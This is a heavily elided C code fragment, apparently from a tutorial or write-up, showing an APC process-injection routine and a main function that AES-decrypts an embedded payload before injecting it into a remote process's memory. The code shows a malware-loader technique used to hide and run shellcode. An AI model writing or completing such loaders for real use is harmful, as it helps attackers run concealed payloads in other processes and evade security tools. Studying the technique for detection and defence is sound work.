...
int ApcInjection(unsigned char* payload, unsigned int payload_len )
{
	...
	PVOID pRemoteCode; // remote buffer
	...
	if (!pRemoteCode)
	{
		_tprintf(TEXT("[!] Cannot allocate memory "));
		return -1;
	}
	...
	_tprintf(TEXT("[+] payload addr = %p ;\n[+] remote buffer addr = %p\n[+] Ready to injection!!\n "), payload, pRemoteCode);
	getchar();
...
int main()
{
	_tprintf(TEXT("[+] START INJECTION\n"));
	// Decrypt payload
	AESDecrypt((char*)payload, payload_len, (char*)key, sizeof(key));

	ApcInjection(payload, payload_len);
	
	_tprintf(TEXT("[+] END INJECTION\n"));
